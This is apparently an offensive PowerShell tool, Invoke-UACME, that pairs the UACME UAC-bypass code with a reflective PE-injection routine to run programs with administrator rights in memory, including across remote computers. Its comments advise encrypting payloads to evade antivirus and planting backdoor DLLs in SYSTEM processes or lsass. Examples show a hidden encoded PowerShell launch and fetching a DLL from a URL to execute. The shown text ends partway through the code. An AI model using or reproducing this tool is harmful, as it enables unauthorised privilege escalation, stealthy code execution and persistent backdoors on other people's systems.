function Invoke-UACME{
<#
.SYNOPSIS

This script leverages UACME 1.9 and Invoke-ReflectivePEInjection to reflectively load UACME completely in memory. This allows you to bypass UAC.
The script has a ComputerName parameter which allows it to be executed against multiple computers.

This script should be able to elevate from Windows 7 up to 10.0.10532 that has PowerShell v2 or higher installed.

Function: Invoke-UACME
Author: redfast00, Twitter @redfast00
UACME Author: hfiref0x, Github https://github.com/hfiref0x
License:  http://creativecommons.org/licenses/by/3.0/fr/
Required Dependencies: UACME (included)
Optional Dependencies: None
ReflectivePEInjection version: 1.1
UACME version: 1.9

.DESCRIPTION

Reflectively loads UACME in memory using PowerShell. This allows you to bypass UAC.

.PARAMETER Command

The command to execute as administrator.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

.PARAMETER ComputerName

Optional, the method to use (Beware, any methods that use processinjection will not work).
	
.EXAMPLE

Invoke-UACME -Command "calc.exe"

.EXAMPLE

Invoke-UACME -Command "powershell.exe -W Hidden -nop -enc AABBCCDDEEFF"

.NOTES

This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the UACME code written by hfiref0x.
Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
Find UACME at: https://github.com/hfiref0x/UACME
.LINK

#>

[CmdletBinding()]
Param(
	[Parameter(ParameterSetName = "Command", Position = 0, Mandatory = $true)]
	[String]
	$Command,

	[Parameter(ParameterSetName = "ComputerName", Position = 1)]
	[String[]]
	$ComputerName
)
$Method = 10
Set-StrictMode -Version 2
Write-Verbose "Started Invoke-UAMCE"

$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$PEBytes64,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$PEBytes32,
		
		[Parameter(Position = 2)]
		[String]
		$Command
	)
	function Invoke-ReflectivePEInjection{

<#
.SYNOPSIS

This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, 
or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, 
please lead the Notes section (GENERAL NOTES) for information on how to use them.


1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.

This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
this will load and execute the DLL/EXE in to memory without writing any files to disk.


2.) Reflectively load a DLL in to memory of a remote process.
As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.

This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the 
remote process. 


While this script provides functionality to specify a file to load from disk a URL, or a byte array, these are more for demo purposes. The way I'd recommend using the script is to create a byte array
containing the file you'd like to reflectively load, and hardcode that byte array in to the script. One advantage of doing this is you can encrypt the byte array and decrypt it in memory, which will
bypass A/V. Another advantage is you won't be making web requests. The script can also load files from SQL Server and be used as a SQL Server backdoor. Please see the Casaba
blog linked below (thanks to whitey).

PowerSploit Function: Invoke-ReflectivePEInjection
Author: Joe Bialek, Twitter: @JosephBialek
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
Version: 1.4

.DESCRIPTION

Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.

.PARAMETER PEPath

The path of the DLL/EXE to load and execute. This file must exist on the computer the script is being run on, not the remote computer.

.PARAMETER PEUrl

A URL containing a DLL/EXE to load and execute.

.PARAMETER PEBytes

A byte array containing a DLL/EXE to load and execute.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

.PARAMETER FuncReturnType

Optional, the return type of the function being called in the DLL. Default: Void
	Options: String, WString, Void. See notes for more information.
	IMPORTANT: For DLLs being loaded remotely, only Void is supported.
	
.PARAMETER ExeArgs

Optional, arguments to pass to the executable being reflectively loaded.
	
.PARAMETER ProcName

Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ProcId

Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ForceASLR

Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn't support ASLR. Some PE's will work with ASLR even
	if the compiler flags don't indicate they support it. Other PE's will simply crash. Make sure to test this prior to using. Has no effect when
	loading in to a remote process.
	
.EXAMPLE

Load DemoDLL from a URL and run the exported function WStringFunc on the current system, print the wchar_t* returned by WStringFunc().
Note that the file name on the website can be any file extension.
Invoke-ReflectivePEInjection -PEUrl http://yoursite.com/DemoDLL.dll -FuncReturnType WString

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName Target.local

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
	the wchar_t* returned by WStringFunc() from all the computers.
Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)

.EXAMPLE

Load DemoEXE and run it locally.
Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs "Arg1 Arg2 Arg3 Arg4"

.EXAMPLE

Load DemoEXE and run it locally. Forces ASLR on for the EXE.
Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR

.EXAMPLE

Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
Invoke-ReflectivePEInjection -PEPath DemoDLL_RemoteProcess.dll -ProcName lsass -ComputerName Target.Local

.EXAMPLE

Load a PE from a byte array.
Invoke-ReflectivePEInjection -PEPath (Get-Content c:\DemoEXE.exe -Encoding Byte) -ExeArgs "Arg1 Arg2 Arg3 Arg4"

.NOTES
GENERAL NOTES:
The script has 3 basic sets of functionality:
1.) Reflectively load a DLL in to the PowerShell process
	-Can return DLL output to user when run remotely or locally.
	-Cleans up memory in the PS process once the DLL finishes executing.
	-Great for running pentest tools on remote computers without triggering process monitoring alerts.
	-By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
2.) Reflectively load an EXE in to the PowerShell process.
	-Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
	-Cleans up memory in the PS process once the DLL finishes executing.
	-Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
3.) Reflectively inject a DLL in to a remote process.
	-Can NOT return DLL output to the user when run remotely OR locally.
	-Does NOT clean up memory in the remote process if/when DLL finishes execution.
	-Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
	-Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.



DLL LOADING NOTES:

PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.

For DLL Loading:
Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
wchar_t*   : FuncReturnType = WString
char*      : FuncReturnType = String
void       : Default, don't supply a FuncReturnType

For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.

The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
WString    : WStringFunc
String     : StringFunc
Void       : VoidFunc

These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
be declared as follows:
extern "C" __declspec( dllexport ) wchar_t* WStringFunc()


If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".

Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection

.LINK

Blog: http://clymb3r.wordpress.com/
Github repo: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection

Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/

#>

[CmdletBinding(DefaultParameterSetName="WebFile")]
Param(
	[Parameter(ParameterSetName = "LocalFile", Position = 0, Mandatory = $true)]
	[String]
	$PEPath,
	
	[Parameter(ParameterSetName = "WebFile", Position = 0, Mandatory = $true)]
	[Uri]
	$PEUrl,

	[Parameter(ParameterSetName = "Bytes", Position = 0, Mandatory = $true)]
	[ValidateNotNullOrEmpty()]
	[Byte[]]
	$PEBytes,
	
	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,
	
	[Parameter(Position = 2)]
	[ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',
	
	[Parameter(Position = 3)]
	[String]
	$ExeArgs,
	
	[Parameter(Position = 4)]
	[Int32]
	$ProcId,
	
	[Parameter(Position = 5)]
	[String]
	$ProcName,

	[Parameter(Position = 6)]
	[Switch]
	$ForceASLR
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

		[Parameter(Position = 4, Mandatory = $true)]
		[Bool]
		$ForceASLR
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
